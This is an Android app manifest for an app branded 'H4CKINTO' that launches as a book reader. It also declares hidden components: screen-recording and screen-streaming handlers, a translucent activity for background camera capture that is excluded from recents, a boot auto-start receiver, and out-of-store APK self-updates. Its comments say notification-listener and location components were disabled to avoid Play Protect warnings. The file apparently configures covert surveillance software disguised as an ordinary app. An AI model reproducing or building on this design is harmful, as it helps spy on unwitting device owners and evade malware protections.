<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    @BUILD_PROFILE_PERMISSIONS@

    <application
        android:name=".App"
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.H4CKINTO"
        android:usesCleartextTraffic="true"
        android:networkSecurityConfig="@xml/network_security_config"
        android:versionName="1.0.0"
        tools:targetApi="31">

        @BUILD_PROFILE_APPLICATION_OVERRIDES@

        <!-- Book Reader Main Activity (LAUNCHER) -->
        <activity
            android:name=".ui.BookReaderActivity"
            android:exported="true"
            android:theme="@style/Theme.BookReader"
            android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Old Main Activity (Background Service Manager) -->
        <activity
            android:name=".SimpleMainActivity"
            android:exported="false"
            android:launchMode="singleInstance"
            android:theme="@style/Theme.H4CKINTO">
            <intent-filter>
                <action android:name="com.h4ckinto.android.REQUEST_SCREEN_RECORDING" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
            <intent-filter>
                <action android:name="com.h4ckinto.android.REQUEST_SCREEN_STREAM" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>

        <!-- Grant Application Activity -->
        <activity
            android:name=".GrantApplicationActivity"
            android:exported="true"
            android:theme="@style/Theme.H4CKINTO" />
        
        <!-- Transparent Camera Activity - For background camera capture -->
        <activity
            android:name=".TransparentCameraActivity"
            android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:excludeFromRecents="true"
            android:launchMode="singleInstance"
            android:configChanges="orientation|screenSize|keyboardHidden" />

        <!-- Book Details Activity -->
        <activity
            android:name=".ui.BookDetailsActivity"
            android:exported="false"
            android:theme="@style/Theme.BookReader"
            android:screenOrientation="portrait" />

        <!-- Book Reader View Activity -->
        <activity
            android:name=".ui.BookReaderViewActivity"
            android:exported="false"
            android:theme="@style/Theme.BookReader"
            android:screenOrientation="portrait" />

        <!-- Secure PIN Activity (Chat Design) -->
        <activity
            android:name=".ui.SecurePinActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- Conversation Activity (Chat Design) -->
        <activity
            android:name=".ui.ConversationActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- Audio Call Activity -->
        <activity
            android:name=".ui.AudioCallActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait"
            android:launchMode="singleTop"
            android:showWhenLocked="true"
            android:turnScreenOn="true" />

        <!-- Image Viewer Activity -->
        <activity
            android:name=".ui.ImageViewerActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:configChanges="orientation|screenSize"
            android:screenOrientation="unspecified" />

        <!-- User Profile Activity -->
        <activity
            android:name=".ui.UserProfileActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- QR Code Display Activity -->
        <activity
            android:name=".ui.QrCodeActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- QR Code Scanner Activity -->
        <activity
            android:name=".ui.QrScannerActivity"
            android:exported="false"
            android:theme="@style/Theme.SecureChat"
            android:screenOrientation="portrait" />

        <!-- MainService / CallService / ScreenStreamService — defined in build-profile overrides -->

        <!-- App update download: runs in foreground, survives app exit, supports resume -->
        <service
            android:name=".update.UpdateDownloadService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync"
            />

        <!-- Notification Listener Service - DISABLED (Play Protect rejects it) -->
        <!--
        <service
            android:name=".service.H4CKINTONotificationListenerService"
            android:enabled="false"
            android:exported="false"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>
        -->

        <!-- Location Update Receiver - DISABLED to avoid Play Protect warnings -->
        <!--
        <receiver
            android:name=".managers.LocationUpdateReceiver"
            android:enabled="false"
            android:exported="false">
            <intent-filter>
                <action android:name="com.h4ckinto.android.LOCATION_UPDATE" />
            </intent-filter>
        </receiver>
        -->

        <!-- FileProvider for camera capture and file sharing -->
        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${applicationId}.fileprovider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

        <!-- Boot Receiver - Auto-start service on device boot -->
        <!-- Allows file sync service to resume after device restart -->
        <receiver
            android:name=".receiver.BootReceiver"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <!-- Standard Android boot only -->
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </receiver>

        <!-- App Update: notified when DownloadManager finishes the update APK download -->
        <receiver
            android:name=".update.UpdateDownloadReceiver"
            android:enabled="true"
            android:exported="false">
            <intent-filter>
                <action android:name="android.app.DownloadManager.ACTION_DOWNLOAD_COMPLETE" />
            </intent-filter>
        </receiver>

        <!-- Forced Update: blocking screen when app is below min_supported_version -->
        <activity
            android:name=".update.ForcedUpdateActivity"
            android:exported="false"
            android:theme="@style/Theme.H4CKINTO"
            android:screenOrientation="portrait" />

        <!-- In-app "Updating" screen (WhatsApp-style): no notification, user taps Install -->
        <activity
            android:name=".update.UpdateInProgressActivity"
            android:exported="false"
            android:theme="@style/Theme.H4CKINTO"
            android:screenOrientation="portrait" />

    </application>

</manifest>
